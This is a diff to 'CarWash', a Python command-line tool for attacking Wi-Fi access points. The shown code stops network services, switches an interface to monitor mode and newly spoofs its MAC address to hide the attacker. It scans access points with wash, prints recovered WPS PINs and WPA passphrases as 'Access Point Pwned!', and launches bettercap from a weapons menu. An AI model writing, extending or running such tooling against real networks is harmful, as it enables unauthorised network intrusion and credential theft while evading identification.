@@ -4,6 +4,8 @@ import csv
 import time
 import sys
 import os
+import socket
+
 
 def print_carwash_ascii():
     carwash_ascii = '''
@@ -25,7 +27,7 @@ def print_carwash_ascii():
                         [|||||||||||||||||||||]
                     ___/~~~~~~~~~~~~~~~~~~~~~~~\___
                    /                               \             
-                 _/       [CarWash]::[1.0.4]        \_           
+                 _/       [CarWash]::[1.0.5]        \_           
              {_}/_____                           _____\{_}       
             .-''      ~~~~~~~~~~~~~~~~~~~~~~~~~~~     ``-.       
           .-~            ____________________            ~-.
@@ -35,7 +37,7 @@ def print_carwash_ascii():
           (~~====___________________________________====~~~)
            \------____________[_Hosaka_]___________-------/
               |      ||                        ||      |
-               \_____/  [d3k4@t3ss3r4]:[2024]   \_____/  
+               \_____/   [d3k@t3ss3r4]:[2024]   \_____/  
                 '''
     print(carwash_ascii)
 
@@ -45,9 +47,10 @@ def is_interface_in_monitor_mode(interface):
     return "Mode:Monitor" in result.stdout
 
 def get_available_interfaces():
+    hostname = socket.gethostname()
     # Get the available wireless interfaces using iwconfig
     time.sleep(.5)
-    click.echo("\nScanning for interface links...")
+    click.echo(f"\n[+]:[↓]:[{hostname}'s available interface links:]:[↓]\n")
     iwconfig_cmd = ["iwconfig"]
     result = subprocess.run(iwconfig_cmd, capture_output=True, text=True)
     output_lines = result.stdout.splitlines()
@@ -57,18 +60,27 @@ def get_available_interfaces():
 def set_monitor_mode(interface):
     needs_monitor_mode = False
     # Set the interface to monitor mode using airmon-ng
-    print("\n[x]:[Systemctl]:[stopping dhcpcd.service.]", flush=True)
+    print("\n[x]:[Systemctl]:[Stopping dhcpcd.service.]", flush=True)
     subprocess.run(["sudo", "systemctl", "stop", "dhcpcd.service"])
     time.sleep(2)
     print("\n[x]:[rfkill]:[Removing blockages.]", flush=True)
     time.sleep(1)
     subprocess.run(["sudo", "rfkill", "unblock", "all"])
-    print("\n[x]:[Airmon-ng]:[check-killing interference on the system.]", flush=True)
+    print("\n[x]:[Airmon-ng]:[Check-killing interference on the system.]", flush=True)
     time.sleep(1)
     subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.PIPE, text=True)
     time.sleep(1)
-    airmon_cmd = ["sudo", "airmon-ng", "start", interface,]
-    subprocess.run(airmon_cmd)
+    print(f"\n[x]:[Airmon-ng]:[Initiating monitor mode on {interface}.]", flush=True)
+    subprocess.run(["sudo", "airmon-ng", "start", interface,], stdout=subprocess.PIPE, text=True)
+    interface = f"{interface}mon"
+    time.sleep(1)
+    print(f"\n[x]:[macchanger]:[Spoofing MAC address for {interface}.]\n", flush=True)
+    subprocess.run(["sudo", "ifconfig", interface, "down"])
+    time.sleep(.5)
+    subprocess.run(["sudo", "macchanger", "-r", interface,])
+    time.sleep(.5)
+    subprocess.run(["sudo", "ifconfig", interface, "up"])
+
     needs_monitor_mode = True
 
     return needs_monitor_mode
@@ -190,7 +202,7 @@ def print_traffic_ticket():
             ap_info = list(reader)
             valid_entries = [ap for ap in ap_info if ap["WPA PSK"]]
             if valid_entries:
-                click.echo("\n[+]:[v]:[Traffic Tickets]:[v]")
+                click.echo("\n[+]:[↓]:[Traffic Tickets]:[↓]")
                 click.echo()
                 # Adjust the column widths here (e.g., change 20 to a lower value)
                 click.echo("{:<4} {:<20} {:<25} {:<14} {:<18}".format("No.", "BSSID", "ESSID", "WPS PIN", "WPA PSK"))
@@ -210,16 +222,16 @@ def print_traffic_ticket():
         click.echo("[-]:[You got no record.. 'runners musta ghosted you...]")
 
 def reset_network_configuration(interface):
+    hostname = socket.gethostname()
     if not click.confirm('\n[?]:[Reset monitor link iface & network config?]', default=True):
         click.echo("\n[-]:[CarWash network config intact and monitor iface up]\n")
         return
-
-    click.echo("\n[+]:[Resetting monitor link iface & network config.]\n")
+    
+    click.echo(f"\n[+]:[Resetting monitor link {interface} & network config.]\n")
     time.sleep(1)
-    airmon_cmd = ["sudo", "airmon-ng", "stop", interface]
-    subprocess.run(airmon_cmd)
+    subprocess.run(["sudo", "airmon-ng", "stop", interface], stdout=subprocess.PIPE, text=True)
     time.sleep(2)
-    click.echo("\n[x]:[airmon-ng]:[Monitor iface down.]")
+    click.echo(f"[x]:[airmon-ng]:[Monitor iface {interface} down.]")
     print("\n[x]:[Systemctl]:[Restarting dhcpcd.service.]", flush=True)
     time.sleep(1)
     subprocess.run(["sudo", "systemctl", "restart", "dhcpcd.service"])
@@ -234,71 +246,77 @@ def reset_network_configuration(interface):
     subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
     time.sleep(1)
     print("\n[x]:[Systemctl]:[NetworkManager active.]", flush=True)
-    click.echo("\n[+]:[Deck is ready to run, chooms.]\n")
+    click.echo(f"\n[+]:[{hostname} cyberdeck is ready to run, chooms.]\n")
     time.sleep(1)
     open_tool()
     
 
 def open_tool():
+    hostname = socket.gethostname()
     if not click.confirm("\n[?]:[Deploy a new tool to keep runnin'?]\n", default=True):
-        click.echo("\n[-]:[Thanks for rolling to the CarWash.]\n")
+        click.echo("\n[-]:[d3k4t3ss3r4:]:[Thanks for rolling to the CarWash.]\n")
+        time.sleep(.5)
+        click.echo("\n[+]:[Hack the Planet, chooms.]")
         return
     
     while True:
         time.sleep(.5)
-        reply = click.prompt("\n[?]:[Choose your weapon wisely:]\n\n[1]:[bettercap]\n[2]:[toolname]\n[3]:[toolname]\n[4]:[toolname]\n[5]:[toolname]\n[6]:[toolname]\n[7]:[...]\n[8]:[...]\n[9]:[...]\n[10]:[...]\n\n[x]:[Exit]\n").lower()
+        reply = click.prompt("\n[?]:[↓]:[Choose your weapon wisely:]:[↓]\n\n[1]:[bettercap]\n[2]:[toolname]\n[3]:[toolname]\n[4]:[toolname]\n[5]:[toolname]\n[6]:[toolname]\n[7]:[...]\n[8]:[...]\n[9]:[...]\n[10]:[...]\n\n[x]:[Exit]\n").lower()
         click.echo()
 
         if reply == "1":
-            click.echo("\n[+]:[Arming and deploying bettercap...]")
-            bettercap_process = subprocess.Popen(["bettercap"])
+            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying bettercap...]")
+            subprocess.Popen(["bettercap"])
             break
         elif reply == "2":
-            click.echo("\n[+]:[Arming and deploying toolname...]")
-            toolname_process = subprocess.Popen(["command+path"])
+            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
+            subprocess.Popen(["command+path"])
             break
         elif reply == "3":
-            click.echo("\n[+]:[Arming and deploying toolname...]")
-            toolname_process = subprocess.Popen(["command+path"])
+            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
+            subprocess.Popen(["command+path"])
             break
         elif reply == "4":
-            click.echo("\n[+]:[Arming and deploying toolname...]")
-            toolname_process = subprocess.Popen(["command+path"])
+            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
+            subprocess.Popen(["command+path"])
             break
         elif reply == "5":
-            click.echo("\n[+]:[Arming and deploying toolname...]")
-            toolname_process = subprocess.Popen(["command+path"])
+            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
+            subprocess.Popen(["command+path"])
             break
         elif reply == "6":
-            click.echo("\n[+]:[Arming and deploying toolname...]")
+            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
             toolname_process = subprocess.Popen(["command+path"])
             break
         elif reply == "7":
-            click.echo("\n[+]:[Arming and deploying toolname...]")
+            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
             toolname_process = subprocess.Popen(["command+path"])
             break
         elif reply == "8":
-            click.echo("\n[+]:[Arming and deploying toolname...]")
+            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
             toolname_process = subprocess.Popen(["command+path"])
             break
         elif reply == "9":
-            click.echo("\n[+]:[Arming and deploying toolname...]")
+            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
             toolname_process = subprocess.Popen(["command+path"])
             break
         elif reply == "10":
-            click.echo("\n[+]:[Arming and deploying toolname...]")
+            click.echo(f"\n[+]:[{hostname}]:[Arming and deploying toolname...]")
             toolname_process = subprocess.Popen(["command+path"])
             break
         elif reply == "x":
-            click.echo("\n[+]:[Exiting...]")
+            click.echo("\n[-]:[d3k4t3ss3r4:]:[Thanks for rolling to the CarWash.]\n")
+            time.sleep(.5)
+            click.echo("\n[+]:[Hack the Planet, chooms.]")
             break
 
     
 def restart_prompt(interface):
     while True:
         if not click.confirm('\n[?]:[rollCar and reWash?]\n', default=True):
-            click.echo("\n[-]:[Thanks for rolling to the CarWash.]\n")
-            reset_network_configuration(interface)  # Call the reset_network_configuration function before exiting
+            click.echo("\n[-]:[d3k4t3ss3r4:]:[Thanks for rolling to the CarWash.]\n")
+            reset_network_configuration(interface)
+            time.sleep(.5)
             click.echo("\n[+]:[Hack the Planet, chooms.]")
             return
 
@@ -326,13 +344,12 @@ def carwash(interface, tickets):
      # If --print-tickets flag is provided, print traffic tickets and exit
     if print_tickets:
         print_traffic_ticket()
-        #restart_prompt(interface)  # Provide option to restart before exiting after printing traffic tickets
-        click.echo("\n[-]:[Thanks for rolling to the CarWash.]\n")
-        click.echo("\n[+]:[Hack the Planet, chooms.]")
+        open_tool()
         sys.exit(0)
+        
 
     # Ask for confirmation before starting the wash process
-    if not click.confirm('\n[?]:[Ready to roll these mean streets?]', default=True):
+    if not click.confirm('\n[?]:[Ready to roll these mean streets console cowboy?]', default=True):
         click.echo("\n[-]:[You fell over the edge punk!]\n")
         click.echo("\n[+]:[Hack the Planet!]")
         return
@@ -347,7 +364,7 @@ def carwash(interface, tickets):
 
         while True:
             try:
-                choice = int(click.prompt("[?]:[What link you wanna' chip?]"))
+                choice = int(click.prompt("\n[?]:[What link you wanna' chip?]"))
                 if 1 <= choice <= len(available_interfaces):
                     interface = available_interfaces[choice - 1]
                     time.sleep(1)
@@ -363,7 +380,7 @@ def carwash(interface, tickets):
             if needs_monitor_mode:
                 interface = f"{interface}mon"
 
-        click.echo(f"\n[+]:[Monitor link {interface} is up.]")
+        click.echo(f"\n[+]:[Monitor link {interface} is up with MAC spoofed.]")
     
 
     # Run wash for 14 seconds and save the output
@@ -376,7 +393,7 @@ def carwash(interface, tickets):
     # Log the AP list
     ap_list = log_ap_list(existing_data)
 
-    click.echo("\n[+]:[Washable Traffic:]")
+    click.echo("\n[+]:[↓]:[Washable Traffic:]:[↓]")
     time.sleep(1)    
     click.echo("{:<4} {:<18} {:<30} {:<8} {:<16}".format("No.", "BSSID", "ESSID", "Chan", "dBm"))
 
@@ -407,8 +424,8 @@ def carwash(interface, tickets):
 
             if wps_pin and wpa_psk:
                 time.sleep(0.5)
-                click.echo(f"\n[x]:[Access Point Pwned!]\n")
-                time.sleep(0.2)
+                click.echo(f"\n[x]:[↓]:[Access Point Pwned!]:[↓]\n")
+                time.sleep(0.2)                
                 click.echo(f"[=]:[{essid}]:[{bssid}]:[{wps_pin}]:[{wpa_psk}]")
             
             # Check for duplicates before adding the results
@@ -436,3 +453,4 @@ def carwash(interface, tickets):
 
 if __name__ == "__main__":
     carwash()
+
